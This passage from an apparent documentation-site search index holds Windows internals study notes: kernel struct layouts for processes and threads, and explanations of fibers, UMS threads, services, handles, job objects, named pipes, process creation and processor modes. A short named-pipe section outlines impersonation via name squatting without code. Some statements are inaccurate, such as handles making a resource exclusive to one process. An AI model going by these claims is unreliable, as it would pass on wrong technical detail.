AuditBlockNonMicrosoftBinaries:1;                         //0x750\n            ULONG AuditBlockNonMicrosoftBinariesAllowStore:1;               //0x750\n            ULONG LoaderIntegrityContinuityEnabled:1;                       //0x750\n            ULONG AuditLoaderIntegrityContinuity:1;                         //0x750\n            ULONG EnableModuleTamperingProtection:1;                        //0x750\n            ULONG EnableModuleTamperingProtectionNoInherit:1;               //0x750\n            ULONG RestrictIndirectBranchPrediction:1;                       //0x750\n            ULONG IsolateSecurityDomain:1;                                  //0x750\n        } MitigationFlagsValues;                                            //0x750\n    };\n    union\n    {\n        ULONG MitigationFlags2;                                             //0x754\n        struct\n        {\n            ULONG EnableExportAddressFilter:1;                              //0x754\n            ULONG AuditExportAddressFilter:1;                               //0x754\n            ULONG EnableExportAddressFilterPlus:1;                          //0x754\n            ULONG AuditExportAddressFilterPlus:1;                           //0x754\n            ULONG EnableRopStackPivot:1;                                    //0x754\n            ULONG AuditRopStackPivot:1;                                     //0x754\n            ULONG EnableRopCallerCheck:1;                                   //0x754\n            ULONG AuditRopCallerCheck:1;                                    //0x754\n            ULONG EnableRopSimExec:1;                                       //0x754\n            ULONG AuditRopSimExec:1;                                        //0x754\n            ULONG EnableImportAddressFilter:1;                              //0x754\n            ULONG AuditImportAddressFilter:1;                               //0x754\n            ULONG DisablePageCombine:1;                                     //0x754\n            ULONG SpeculativeStoreBypassDisable:1;                          //0x754\n            ULONG CetUserShadowStacks:1;                                    //0x754\n            ULONG AuditCetUserShadowStacks:1;                               //0x754\n            ULONG AuditCetUserShadowStacksLogged:1;                         //0x754\n            ULONG UserCetSetContextIpValidation:1;                          //0x754\n            ULONG AuditUserCetSetContextIpValidation:1;                     //0x754\n            ULONG AuditUserCetSetContextIpValidationLogged:1;               //0x754\n            ULONG CetUserShadowStacksStrictMode:1;                          //0x754\n            ULONG BlockNonCetBinaries:1;                                    //0x754\n            ULONG BlockNonCetBinariesNonEhcont:1;                           //0x754\n            ULONG AuditBlockNonCetBinaries:1;                               //0x754\n            ULONG AuditBlockNonCetBinariesLogged:1;                         //0x754\n            ULONG XtendedControlFlowGuard_Deprecated:1;                     //0x754\n            ULONG AuditXtendedControlFlowGuard_Deprecated:1;                //0x754\n            ULONG PointerAuthUserIp:1;                                      //0x754\n            ULONG AuditPointerAuthUserIp:1;                                 //0x754\n            ULONG AuditPointerAuthUserIpLogged:1;                           //0x754\n            ULONG CetDynamicApisOutOfProcOnly:1;                            //0x754\n            ULONG UserCetSetContextIpValidationRelaxedMode:1;               //0x754\n        } MitigationFlags2Values;                                           //0x754\n    };\n    VOID* PartitionObject;                                                  //0x758\n    ULONGLONG SecurityDomain;                                               //0x760\n    ULONGLONG ParentSecurityDomain;                                         //0x768\n    VOID* CoverageSamplerContext;                                           //0x770\n    VOID* MmHotPatchContext;                                                //0x778\n    struct _RTL_AVL_TREE DynamicEHContinuationTargetsTree;                  //0x780\n    struct _EX_PUSH_LOCK DynamicEHContinuationTargetsLock;                  //0x788\n    struct _PS_DYNAMIC_ENFORCED_ADDRESS_RANGES DynamicEnforcedCetCompatibleRanges; //0x790\n    ULONG DisabledComponentFlags;                                           //0x7a0\n    volatile LONG PageCombineSequence;                                      //0x7a4\n    struct _EX_PUSH_LOCK EnableOptionalXStateFeaturesLock;                  //0x7a8\n    ULONG* volatile PathRedirectionHashes;                                  //0x7b0\n    struct _PS_SYSCALL_PROVIDER* SyscallProvider;                           //0x7b8\n    struct _LIST_ENTRY SyscallProviderProcessLinks;                         //0x7c0\n    struct _PSP_SYSCALL_PROVIDER_DISPATCH_CONTEXT SyscallProviderDispatchContext; //0x7d0\n    union\n    {\n        ULONG MitigationFlags3;                                             //0x7d8\n        struct\n        {\n            ULONG RestrictCoreSharing:1;                                    //0x7d8\n            ULONG DisallowFsctlSystemCalls:1;                               //0x7d8\n            ULONG AuditDisallowFsctlSystemCalls:1;                          //0x7d8\n            ULONG MitigationFlags3Spare:29;                                 //0x7d8\n        } MitigationFlags3Values;                                           //0x7d8\n    };\n    union\n    {\n        ULONG Flags4;                                                       //0x7dc\n        struct\n        {\n            ULONG ThreadWasActive:1;                                        //0x7dc\n            ULONG MinimalTerminate:1;                                       //0x7dc\n            ULONG ImageExpansionDisable:1;                                  //0x7dc\n            ULONG SessionFirstProcess:1;                                    //0x7dc\n        };\n    };\n    union\n    {\n        ULONG SyscallUsage;                                                 //0x7e0\n        struct\n        {\n            ULONG SystemModuleInformation:1;                                //0x7e0\n            ULONG SystemModuleInformationEx:1;                              //0x7e0\n            ULONG SystemLocksInformation:1;                                 //0x7e0\n            ULONG SystemStackTraceInformation:1;                            //0x7e0\n            ULONG SystemHandleInformation:1;                                //0x7e0\n            ULONG SystemExtendedHandleInformation:1;                        //0x7e0\n            ULONG SystemObjectInformation:1;                                //0x7e0\n            ULONG SystemBigPoolInformation:1;                               //0x7e0\n            ULONG SystemExtendedProcessInformation:1;                       //0x7e0\n            ULONG SystemSessionProcessInformation:1;                        //0x7e0\n            ULONG SystemMemoryTopologyInformation:1;                        //0x7e0\n            ULONG SystemMemoryChannelInformation:1;                         //0x7e0\n            ULONG SystemUnused:1;                                           //0x7e0\n            ULONG SystemPlatformBinaryInformation:1;                        //0x7e0\n            ULONG SystemFirmwareTableInformation:1;                         //0x7e0\n            ULONG SystemBootMetadataInformation:1;                          //0x7e0\n            ULONG SystemWheaIpmiHardwareInformation:1;                      //0x7e0\n            ULONG SystemSuperfetchPrefetch:1;                               //0x7e0\n            ULONG SystemSuperfetchPfnQuery:1;                               //0x7e0\n            ULONG SystemSuperfetchPrivSourceQuery:1;                        //0x7e0\n            ULONG SystemSuperfetchMemoryListQuery:1;                        //0x7e0\n            ULONG SystemSuperfetchMemoryRangesQuery:1;                      //0x7e0\n            ULONG SystemSuperfetchPfnSetPriority:1;                         //0x7e0\n            ULONG SystemSuperfetchMovePages:1;                              //0x7e0\n            ULONG SystemSuperfetchPfnSetPageHeat:1;                         //0x7e0\n            ULONG SysDbgGetTriageDump:1;                                    //0x7e0\n            ULONG SysDbgGetLiveKernelDump:1;                                //0x7e0\n            ULONG SyscallUsageValuesSpare:5;                                //0x7e0\n        } SyscallUsageValues;                                               //0x7e0\n    };\n    LONG SupervisorDeviceAsid;                                              //0x7e4\n    VOID* SupervisorSvmData;                                                //0x7e8\n    struct _PROCESS_NETWORK_COUNTERS* NetworkCounters;                      //0x7f0\n    union _PROCESS_EXECUTION Execution;                                     //0x7f8\n    VOID* ThreadIndexTable;                                                 //0x800\n};\n</code></pre>"},{"location":"Windows_Internals/Processes/#high-level-components","title":"High-level components","text":"Component Purpose <code>Name</code> Define the name of the process, typically inherited from the application. <code>Status</code> Determines how the process is running (running, suspended, etc.) <code>Private virtual address space</code> A set of virtual memory addresses available to be used by the process. <code>Executable program</code> The initial code and data of the executable that is stored into the private virtual address space. <code>List of open handles</code> A list of open handles to be used by the process's threads to interact with system resources. <code>Security context</code> This is the access token that identifies the user, security groups, privileges, attributes, claims, capabilities, UAC virtualization state, session and limited user-account state associated with the process. It also identifies the AppContainer and it's also related to sandboxing information. <code>User name</code> User that initiated the process. Can denote privilege of the process <code>Process ID (PID)</code> A unique identifier for the process. Internally this is part of an identifier named \"client ID\". <code>Threads</code> (of execution) A process contains at least one thread of execution. <code>Environment variables</code> Metadata used by the process to understand what OS environment it's running in. <code>Priority class</code> Tells the scheduler how often the CPU should look at the threads in this process. <code>Minimum and maximum working set sizes (RAM)</code> The amount of RAM the process can use. <code>Process state</code> The current state of the process like; Created, Terminated, Running, Waiting, Suspended, Blocked, etc."},{"location":"Windows_Internals/Processes/#low-level-components","title":"Low-level components","text":"Component Purpose <code>Code</code> Code to be executed by the process. <code>Global Variables</code> Stored variables. <code>Process Heap</code> Defines the heap where data is stored. <code>Process Resources</code> Defines further resources of the process. <code>Process Environment Block</code> Data structure to define process information."},{"location":"Windows_Internals/Processes/#threads","title":"Threads","text":"<p>In essence, processes aren't even executed by the CPU. The threads inside of the process are executed by the CPU, they typically represent the code.</p> <p>A <code>thread</code> is an <code>executable unit- or entity</code> employed by a process and scheduled for execution based on device factors.</p> <p>When we have a process with two or more threads it's called a Multi-Threaded process. At first programs were Single-Threaded but as CPU's evolved and got multiple cores this gave us a way to get a lot more done with our threads.</p> <p>Threads may seem like a bare-bones and simple component, but it's <code>function is critical</code> to processes. Without this a process wouldn't be able to \"run\". We can simplify the definition of a thread: <code>controlling the execution of a process</code>.</p> <ul> <li>Device factors can vary based on CPU and memory specifications, priority and logical factors, and others.</li> <li>All threads within a process share the process's virtual address space and system resources, such as code, global variables, etc.</li> </ul> <p>Threads can also switch between eachother to control execution (<code>context-switching</code>), commonly seen in multi-threaded applications. However, this involves the kernel scheduler and can become quite expensive. To solve this issue Windows implements two mechanisms to reduce the overhead cost for the CPU: - <code>Fibers</code> - <code>User-mode Scheduling (UMS)</code> </p> <p>Threads also have their unique values and architecture-specific components called the <code>Thread context</code>. The Windows <code>GetThreadContext</code> function provides access to this <code>architecture-specific structure (context block)</code>.</p>"},{"location":"Windows_Internals/Processes/#thread-context","title":"Thread context","text":"Component Purpose <code>Context Structure</code> or <code>Volatile registers</code> Holds a set of CPU registers that represent the state of the processor maintained by the kernel. <code>Two stacks</code> All data relevant and specific to the thread (exceptions, procedure calls, etc.). One to execute Kernel-mode and one for User-mode execution. <code>Thread-Local Storage</code> (TLS) A private storage area (a unique data environment) used for allocation by sub-systems, run-time libraries and DLLs. <code>Thread ID</code> or <code>Stack Argument</code> Unique value (identifier) assigned to each thread, part of the <code>client ID structure</code>. <code>Security context</code> Sometimes threads have their own security context or token. Commonly used by multi-threaded server applications that clone the security context of their served client. <code>Priority class</code> Representing the priority of the execution of the thread.  Kernel structure  <pre><code>//0x788 bytes (sizeof)\nstruct _ETHREAD\n{\n    struct _KTHREAD Tcb;                                                    //0x0\n    union _LARGE_INTEGER CreateTime;                                        //0x4c0\n    union\n    {\n        union _LARGE_INTEGER ExitTime;                                      //0x4c8\n        struct _LIST_ENTRY KeyedWaitChain;                                  //0x4c8\n    };\n    union\n    {\n        struct _LIST_ENTRY PostBlockList;                                   //0x4d8\n        struct\n        {\n            VOID* ForwardLinkShadow;                                        //0x4d8\n            VOID* StartAddress;                                             //0x4e0\n        };\n    };\n    union\n    {\n        struct _TERMINATION_PORT* TerminationPort;                          //0x4e8\n        struct _ETHREAD* ReaperLink;                                        //0x4e8\n        VOID* KeyedWaitValue;                                               //0x4e8\n    };\n    ULONGLONG ActiveTimerListLock;                                          //0x4f0\n    struct _LIST_ENTRY ActiveTimerListHead;                                 //0x4f8\n    struct _CLIENT_ID Cid;                                                  //0x508\n    union\n    {\n        struct _KSEMAPHORE KeyedWaitSemaphore;                              //0x518\n        struct _KSEMAPHORE AlpcWaitSemaphore;                               //0x518\n    };\n    union _PS_CLIENT_SECURITY_CONTEXT ClientSecurity;                       //0x538\n    struct _LIST_ENTRY IrpList;                                             //0x540\n    ULONGLONG TopLevelIrp;                                                  //0x550\n    struct _DEVICE_OBJECT* DeviceToVerify;                                  //0x558\n    VOID* Win32StartAddress;                                                //0x560\n    VOID* ChargeOnlySession;                                                //0x568\n    VOID* LegacyPowerObject;                                                //0x570\n    struct _LIST_ENTRY ThreadListEntry;                                     //0x578\n    struct _EX_RUNDOWN_REF RundownProtect;                                  //0x588\n    struct _EX_PUSH_LOCK ThreadLock;                                        //0x590\n    ULONG ReadClusterSize;                                                  //0x598\n    volatile ULONG MmLockOrdering;                                          //0x59c\n    union\n    {\n        ULONG CrossThreadFlags;                                             //0x5a0\n        struct\n        {\n            ULONG Terminated:1;                                             //0x5a0\n            ULONG ThreadInserted:1;                                         //0x5a0\n            ULONG HideFromDebugger:1;                                       //0x5a0\n            ULONG ActiveImpersonationInfo:1;                                //0x5a0\n            ULONG HardErrorsAreDisabled:1;                                  //0x5a0\n            ULONG BreakOnTermination:1;                                     //0x5a0\n            ULONG SkipCreationMsg:1;                                        //0x5a0\n            ULONG SkipTerminationMsg:1;                                     //0x5a0\n            ULONG CopyTokenOnOpen:1;                                        //0x5a0\n            ULONG ThreadIoPriority:3;                                       //0x5a0\n            ULONG ThreadPagePriority:3;                                     //0x5a0\n            ULONG RundownFail:1;                                            //0x5a0\n            ULONG UmsForceQueueTermination:1;                               //0x5a0\n            ULONG IndirectCpuSets:1;                                        //0x5a0\n            ULONG DisableDynamicCodeOptOut:1;                               //0x5a0\n            ULONG ExplicitCaseSensitivity:1;                                //0x5a0\n            ULONG PicoNotifyExit:1;                                         //0x5a0\n            ULONG DbgWerUserReportActive:1;                                 //0x5a0\n            ULONG ForcedSelfTrimActive:1;                                   //0x5a0\n            ULONG SamplingCoverage:1;                                       //0x5a0\n            ULONG ImpersonationSchedulingGroup:1;                           //0x5a0\n            ULONG ReservedCrossThreadFlags:7;                               //0x5a0\n        };\n    };\n    union\n    {\n        ULONG SameThreadPassiveFlags;                                       //0x5a4\n        struct\n        {\n            ULONG ActiveExWorker:1;                                         //0x5a4\n            ULONG MemoryMaker:1;                                            //0x5a4\n            ULONG StoreLockThread:2;                                        //0x5a4\n            ULONG ClonedThread:1;                                           //0x5a4\n            ULONG KeyedEventInUse:1;                                        //0x5a4\n            ULONG SelfTerminate:1;                                          //0x5a4\n            ULONG RespectIoPriority:1;                                      //0x5a4\n            ULONG ActivePageLists:1;                                        //0x5a4\n            ULONG SecureContext:1;                                          //0x5a4\n            ULONG ZeroPageThread:1;                                         //0x5a4\n            ULONG WorkloadClass:1;                                          //0x5a4\n            ULONG GenerateDumpOnBadHandleAccess:1;                          //0x5a4\n            ULONG BalanceSetManager:1;                                      //0x5a4\n            ULONG ReservedSameThreadPassiveFlags:18;                        //0x5a4\n        };\n    };\n    union\n    {\n        ULONG SameThreadApcFlags;                                           //0x5a8\n        struct\n        {\n            UCHAR OwnsProcessAddressSpaceExclusive:1;                       //0x5a8\n            UCHAR OwnsProcessAddressSpaceShared:1;                          //0x5a8\n            UCHAR HardFaultBehavior:1;                                      //0x5a8\n            volatile UCHAR StartAddressInvalid:1;                           //0x5a8\n            UCHAR EtwCalloutActive:1;                                       //0x5a8\n            UCHAR SuppressSymbolLoad:1;                                     //0x5a8\n            UCHAR Prefetching:1;                                            //0x5a8\n            UCHAR OwnsVadExclusive:1;                                       //0x5a8\n            UCHAR SystemPagePriorityActive:1;                               //0x5a9\n            UCHAR SystemPagePriority:3;                                     //0x5a9\n            UCHAR AllowUserWritesToExecutableMemory:1;                      //0x5a9\n            UCHAR AllowKernelWritesToExecutableMemory:1;                    //0x5a9\n            UCHAR OwnsVadShared:1;                                          //0x5a9\n            UCHAR PasidMsrValid:1;                                          //0x5a9\n            UCHAR SlabReplenishInProgress:1;                                //0x5aa\n        };\n    };\n    UCHAR CacheManagerActive;                                               //0x5ac\n    UCHAR DisablePageFaultClustering;                                       //0x5ad\n    UCHAR ActiveFaultCount;                                                 //0x5ae\n    UCHAR LockOrderState;                                                   //0x5af\n    ULONG SharedPsModuleLockAcquires;                                       //0x5b0\n    ULONG MmReserved;                                                       //0x5b4\n    ULONGLONG AlpcMessageId;                                                //0x5b8\n    union\n    {\n        VOID* AlpcMessage;                                                  //0x5c0\n        ULONG AlpcReceiveAttributeSet;                                      //0x5c0\n    };\n    struct _LIST_ENTRY AlpcWaitListEntry;                                   //0x5c8\n    LONG ExitStatus;                                                        //0x5d8\n    ULONG CacheManagerCount;                                                //0x5dc\n    ULONG IoBoostCount;                                                     //0x5e0\n    ULONG IoQoSBoostCount;                                                  //0x5e4\n    ULONG IoQoSThrottleCount;                                               //0x5e8\n    ULONG KernelStackReference;                                             //0x5ec\n    struct _LIST_ENTRY BoostList;                                           //0x5f0\n    struct _LIST_ENTRY DeboostList;                                         //0x600\n    ULONGLONG BoostListLock;                                                //0x610\n    ULONGLONG IrpListLock;                                                  //0x618\n    VOID* ReservedForSynchTracking;                                         //0x620\n    struct _SINGLE_LIST_ENTRY CmCallbackListHead;                           //0x628\n    struct _GUID* ActivityId;                                               //0x630\n    struct _SINGLE_LIST_ENTRY SeLearningModeListHead;                       //0x638\n    VOID* VerifierContext;                                                  //0x640\n    VOID* AdjustedClientToken;                                              //0x648\n    VOID* WorkOnBehalfThread;                                               //0x650\n    struct _PS_PROPERTY_SET PropertySet;                                    //0x658\n    VOID* PicoContext;                                                      //0x670\n    ULONGLONG UserFsBase;                                                   //0x678\n    ULONGLONG UserGsBase;                                                   //0x680\n    struct _THREAD_ENERGY_VALUES* EnergyValues;                             //0x688\n    union\n    {\n        ULONGLONG SelectedCpuSets;                                          //0x690\n        ULONGLONG* SelectedCpuSetsIndirect;                                 //0x690\n    };\n    struct _EJOB* Silo;                                                     //0x698\n    struct _UNICODE_STRING* ThreadName;                                     //0x6a0\n    struct _CONTEXT* SetContextState;                                       //0x6a8\n    VOID* EtwSupport;                                                       //0x6b0\n    struct _LIST_ENTRY OwnerEntryListHead;                                  //0x6b8\n    ULONGLONG DisownedOwnerEntryListLock;                                   //0x6c8\n    struct _LIST_ENTRY DisownedOwnerEntryListHead;                          //0x6d0\n    VOID* SchedulerSharedDataObject;                                        //0x6e0\n    VOID* CmThreadInfo;                                                     //0x6e8\n    VOID* FlsData;                                                          //0x6f0\n    ULONG LastExpectedRunTime;                                              //0x6f8\n    ULONG LastSoftParkElectionRunTime;                                      //0x6fc\n    ULONGLONG LastSoftParkElectionGeneration;                               //0x700\n    struct _GROUP_AFFINITY LastSoftParkElectionGroupAffinity;               //0x708\n    ULONGLONG UserIsolationDomain;                                          //0x718\n    union\n    {\n        struct _KAPC UpdateTebApc;                                          //0x720\n        struct\n        {\n            UCHAR UpdateTebApcFill1[3];                                     //0x720\n            CHAR Win32kPriorityFloor;                                       //0x723\n        };\n        struct\n        {\n            UCHAR UpdateTebApcFill2[4];                                     //0x720\n            UCHAR LastSoftParkElectionQos;                                  //0x724\n            UCHAR LastSoftParkElectionWorkloadType;                         //0x725\n            UCHAR LastSoftParkElectionRunningType;                          //0x726\n            UCHAR MmSlabIdentity;                                           //0x727\n        };\n        struct\n        {\n            UCHAR UpdateTebApcFill3[64];                                    //0x720\n            union _RTL_THREAD_RNG_STATE RngState;                           //0x760\n        };\n        struct\n        {\n            UCHAR UpdateTebApcFill4[72];                                    //0x720\n            VOID* UsedByRngState;                                           //0x768\n        };\n        struct\n        {\n            UCHAR UpdateTebApcFill5[83];                                    //0x720\n            UCHAR UpdateTebSpareByte2;                                      //0x773\n            ULONG UpdateTebSpareLong2;                                      //0x774\n        };\n    };\n    ULONGLONG Win32kThreadLock;                                             //0x778\n    VOID* ThreadIndex;                                                      //0x780\n};\n</code></pre>"},{"location":"Windows_Internals/Processes/#fibers","title":"Fibers","text":"<p>Think of fibers like a lightweight thread that you control / schedule yourself. Fibers are invisible to the kernel because they're implemented in user mode in Kernel32.dll, making scheduling of execution manual rather than relying on Windows priority-based scheduling mechanism.</p> <p>In most cases, letting Windows manage threads automatically is a better choice over managing User-mode fibers manually.</p>"},{"location":"Windows_Internals/Processes/#working-with-fibers","title":"Working with Fibers","text":"<ol> <li>You start with a normal thread and call <code>ConvertThreadToFiber</code>. This function converts the thread to a running fiber.</li> <li>You can make more fibers using <code>CreateFiber</code>. Each fiber can have it's own set of fibers.</li> <li>Instead of Windows deciding which fiber runs, you call <code>SwitchToFiber</code> to manually choose which fiber gets to execute.</li> <li>The new fiber runs until it exits or until it calls SwitchToFiber, again selecting another fiber to run.</li> </ol>"},{"location":"Windows_Internals/Processes/#fibers-limitations","title":"Fibers limitations","text":"<ul> <li>Invisible to the kernel: Since the operating system doesn\u2019t know fibers exist, it can\u2019t schedule them properly. This can lead to bad performance.</li> <li>TLS issues: Sharing thread local storage (TLS) can be an issue because several fibers can be running on the same thread.</li> <li>No True Multithreading: Fibers don\u2019t run on multiple processors at the same time, they are limited to cooperative multi-tasking only. Only one fiber runs per thread.</li> <li>Poor I/O performance: Fiber local storage (FLS) exists but doesn't solve all the issues. If a fiber is waiting on a file or network request, the entire thread is stuck waiting.</li> </ul>  User-mode structure  <pre><code>typedef struct _NT_FIBER {\n    PVOID FiberData;         // Pointer to user-defined fiber-specific (storage) data, similar to TLS\n    struct _NT_FIBER *Self;  // Self-reference for integrity checks\n    PVOID StackBase;         // Base of the fiber\u2019s stack (highest memory address)\n    PVOID StackLimit;        // Stack limit (where stack grows towards)\n    PVOID DeallocationStack; // Pointer to memory reserved for stack deallocation\n    CONTEXT FiberContext;    // CPU register state for fiber switching\n    BOOLEAN FiberFlags;      // Flags (e.g.: Is this the primary fiber?) + other metadeta\n} NT_FIBER, *PNT_FIBER;\n</code></pre>"},{"location":"Windows_Internals/Processes/#user-mode-scheduling-threads","title":"User-mode Scheduling threads","text":"<p>User-mode scheduling (UMS) threads, which are available only on 64-bit versions of Windows are an improved version of fibers, with fewer downsides.</p> <p>They still allow programs to manage their own scheduling instead of relying entirely on the Windows scheduler. However, UMS threads have their own kernel thread state, because of that they are visible to the kernel in contrast to fibers. </p> <p>This visibility to the kernel means: - Allow multiple UMS threads to issue system calls that block execution (e.g.: waiting for file access). - Share and manage resources properly, unlike fibers.</p>"},{"location":"Windows_Internals/Processes/#how-ums-threads-work","title":"How UMS Threads work","text":"<ul> <li>When multiple UMS threads need to run in user mode, they can switch between each other without involving the Windows scheduler.</li> <li>From the kernel\u2019s perspective, it looks like the same thread is still running, even though UMS threads are switching internally.</li> <li>When a UMS thread needs to enter the kernel (e.g., making a system call), it temporarily switches to a dedicated kernel-mode thread (this is called a directed context switch).</li> <li>Every thread in a process shares the same virtual address space, meaning they can read and write the same memory.</li> <li>Threads cannot access another process\u2019s memory unless:<ul> <li>The other process explicitly shares memory (e.g., using a file mapping object).</li> <li>The process has special permissions (e.g., using ReadProcessMemory and WriteProcessMemory).</li> </ul> </li> </ul>"},{"location":"Windows_Internals/Processes/#ums-threads-limitations","title":"UMS Threads limitations","text":"<ul> <li>UMS threads still can't run on multiple processors at the same time.</li> <li>However, they do follow a pre-emptible model, meaning they aren't purely cooperative like fibers (they can be interrupted if needed).</li> </ul>"},{"location":"Windows_Internals/Processes/#services","title":"Services","text":"<p>A service is a process that is designed to perform a specific service for the operating system. These processes get started by the Windows <code>service control manager (SCM)</code> and are usually background processes.</p> <p>Since it runs in the background it doesn't have a GUI or require any interaction from the user.</p> <p>They run independently of user sessions and provide essential system functions, such as networking, printing, and security. They can start automatically, manually, or on demand.</p>"},{"location":"Windows_Internals/Processes/#types-of-services","title":"Types of services","text":"System services critical to the OS Purpose <code>wininit.exe</code> Windows Initialization <code>lsass.exe</code> Local Security Authority <code>services.exe</code> Service Control Manager Networking Services to manage connections Purpose <code>Dhcp</code> Dynamic Host Configuration Protocol <code>Dnscache</code> DNS Client Service <code>LanmanServer</code> File Sharing &amp; Network Services Security Services to protect the system purpose WinDefend Windows Defender Antivirus EventLog Windows Event Logging W32Time Windows Time Synchronization Hardware Services to manage devices purpose Spooler Print Spooler PlugPlay Plug and Play service AudioSrv Windows Audio Application Services installed by third-party apps purpose SQL Server MSSQLSERVER database services Apache or Nginx Web server services VMware or VirtualBox OS virtualization"},{"location":"Windows_Internals/Processes/#child-parent-processes","title":"Child-Parent processes","text":"<p>It's also possible for processes to create / initialize other processes. The process that created the other is called the <code>parent process</code>. The process that got created is called the <code>child process</code>.</p> <p>E.g: explorer.exe initializing a msedge.exe process that initializes multiple other msedge.exe processes.</p> <pre><code>explorer.exe\n\u2514\u2500\u2500 msedge.exe\n    \u251c\u2500\u2500 msedge.exe\n    \u251c\u2500\u2500 msedge.exe\n    \u251c\u2500\u2500 msedge.exe\n    \u251c\u2500\u2500 msedge.exe\n    \u251c\u2500\u2500 msedge.exe\n    \u251c\u2500\u2500 msedge.exe\n    \u251c\u2500\u2500 msedge.exe\n    \u251c\u2500\u2500 msedge.exe\n    \u2514\u2500\u2500 msedge.exe\n</code></pre>"},{"location":"Windows_Internals/Processes/#handles","title":"Handles","text":"<p>Like we've mentioned before in the overview, everything in Windows could be seen as an <code>object</code>. Oversimplified but, a handle is a <code>reference</code> to a Windows object.</p> <p>When threads are being run they often require system resources like registry keys, files, folders, session information, etc. </p> <p>Essentially, it's a declaration from a thread saying that this <code>system resource</code> / <code>object</code> is being used by the process.</p> <p>Note</p> <p>A handle makes the specified system resource solely available to it's process.</p> <p>It acts as if it's in a locked state from the perspective of outside processes. If you've ever tried to delete a file that's still open in some process like Word you'd get a message saying: \"This action can't be completed because the file is open in Word.\".</p>"},{"location":"Windows_Internals/Processes/#jobs-job-object","title":"Jobs / Job Object","text":"<p>A job (object) in Windows is a management structure that groups multiple processes together into a singular unit. It allows the system (or an administrator) to control and apply limits (e.g., CPU, memory, I/O) to all processes inside the job as a single unit.</p> <ul> <li>When a process is assigned to a job, it cannot leave the job unless explicitly allowed.</li> <li>If a job is terminated, all processes inside it are also terminated.</li> <li>Jobs are often used in server environments to control resource usage for groups of processes.</li> </ul> <p>A job can: - Apply limits to processes inside the job (e.g., memory, CPU usage). - Monitor and track resource usage for all processes in the job. - Control process behavior, such as preventing them from creating new processes outside the job.</p> <p>Essentially, job objects make up for the lack of a structured process tree (unlike UNIX, where processes naturally have parent-child relationships). But jobs are actually more powerful because they allow fine-tuned control over multiple processes at once.</p>"},{"location":"Windows_Internals/Processes/#named-pipes","title":"Named pipes","text":"<p>Named pipes are just a mechanism for two processes to talk to eachother. This comes with another more windows-specific vulnerability; name squatting.</p> <ol> <li>Create a named pipe that is used for client-server communication.</li> <li>Start a client that uses said pipe.</li> <li>Use client impersonation to get client priveleges.</li> </ol>"},{"location":"Windows_Internals/Processes/#process-creation-in-the-kernel","title":"Process creation in the kernel","text":"<p>The steps the kernel takes to create a process are:</p> <ol> <li>Initialize the process address space<ul> <li>Map <code>KUSER_SHARED_DATA</code>, read-only shared memory used for system time, tick count, and other global data.</li> <li>Map the <code>executable</code>, Loads the program file into memory.</li> <li>Map <code>ntdll.dll</code>, This library is essential for <code>system calls</code>, so it\u2019s always mapped into the process.</li> <li>Allocate the PEB, Stores information like command-line arguments, loaded modules, and heap details.</li> </ul> </li> <li>Create the initial thread</li> <li>Allocate the stack(s), each thread gets a user-mode stack and a kernel-mode stack.</li> <li>Allocate the TEB, stores per-thread information like thread ID, exception handling data, and TLS slots.</li> <li> <p>Set the instruction pointer to <code>ntdll.LdrInitializeThunk</code>, instead of directly executing the program, the thread first runs a function in ntdll.dll to prepare the environment.</p> <ul> <li>Handles dynamic DLL loading \u2192 Loads required DLLs like kernel32.dll, user32.dll, etc.</li> <li>Processes TLS Callbacks \u2192 Calls thread-local storage (TLS) initializers.</li> <li>Calls DllMain for loaded DLLs \u2192 If a DLL has a DllMain function, it gets executed here.</li> <li>Sets up the loader lock \u2192 Prevents race conditions during DLL loading.</li> <li>Performs a system call: <code>ZwContinue</code> \u2192 A system call that resumes execution in a new thread context, transferring control to <code>RtlUserThreadStart</code>.</li> </ul> </li> <li> <p><code>RtlUserThreadStart</code>: calls <code>kernel32.BaseThreadInitThunk</code> transferring to User-mode.</p> </li> <li><code>BaseThreadInitThunk</code>:<ul> <li>Sets up SEH (structured exception handling).</li> <li>Calls <code>mainCRTStartup(PEB)</code>.</li> </ul> </li> <li><code>mainCRTStartup(PEB)</code> (provided by the C runtime library): calls <code>main(argc, argv)</code> (for C programs) or <code>WinMain</code> (for Windows GUI applications).</li> </ol> <p>Warning</p> <p>The PEB and TEB are part of a process\u2019s virtual address space in memory. Don't confuse a process's Virtual Memory Components with process components.</p>"},{"location":"Windows_Internals/Processes/#tools","title":"Tools","text":"<ul> <li>Process Hacker 2 / System informer</li> <li>Process Explorer</li> <li>Procmon</li> </ul>"},{"location":"Windows_Internals/Processor_Modes/","title":"Processor modes","text":"<p>The Windows operating system has a <code>user mode</code> and a <code>kernel mode</code>. This security measure is implemented through processor <code>acces modes</code> and <code>privilege levels</code>. Some processors might use terms like <code>code privilege level</code>, <code>ring level</code>, <code>supervisor mode</code> and <code>application mode</code>.</p> <p>An application by default cannot interact with the kernel or modify critical OS data. This is a safety mechanism that ensures that User-mode applications won't disrupt the stability of the system. </p> <p>The processor will switch between these modes <code>depending on access and requested mode</code>. Even if the processor supports multiple modes, Windows will only ever use two for compatibility reasons with other operating systems.</p> User mode Kernel Mode No direct hardware access Direct hardware access Creates a process in a private virtual address space Ran in a single shared virtual address space Access to \"owned memory locations\" in the VAS access to all system memory and all CPU instructions Runs user application code Runes OS code"},{"location":"Windows_Internals/Processor_Modes/#privilidge-levels","title":"Privilidge levels","text":"<p>You might have noticed that these modes like user-mode and kernel-mode provide different priviledges associated with the mode. As a general rule: user-mode has access to anything that's withing userland or user-space: <code>ring 3</code>. Essentially, kernel-mode has access to everything: <code>ring 0</code>.</p> <p>Warning</p> <p>x86 and x86-64 processors define four rings. </p> <p>Again, Windows will only use two for: compatibility reasons, efficiency and portability and because the other x86/x86-x64 ring levels do not provide the same guarantees.</p>"},{"location":"Windows_Internals/Processor_Modes/#system-calls-and-the-switching-point","title":"System calls and the Switching Point","text":"<p>Applications that start in <code>user mode</code> (also known as <code>userland</code>) remain in that mode until they make a <code>system call (syscall)</code> or interact with the OS via an API. When a syscall occurs, the application transitions into kernel mode to execute privileged operations.</p> <p>Warning</p> <p>User-mode has many terms; User-mode, userspace, userland, etc.</p> <p>Userland is a common term, however, it's not a term defined by Windows.</p> <ul> <li>User applications switch to kernel mode when making system calls (e.g., <code>ReadFile</code>).</li> <li>A special processor instruction triggers this transition, allowing access to protected system structures in <code>Ntoskrnl.exe</code> or <code>Win32k.sys</code>.</li> <li>The processor switches back to user mode before returning control to the application, ensuring system protection.</li> <li>Mode transitions are not context switches and do not affect thread scheduling.</li> <li>Graphics-intensive apps spend more time in kernel mode since the windowing system runs there.</li> <li>Newer technologies like <code>Direct2D</code> and <code>DirectComposition</code> reduce 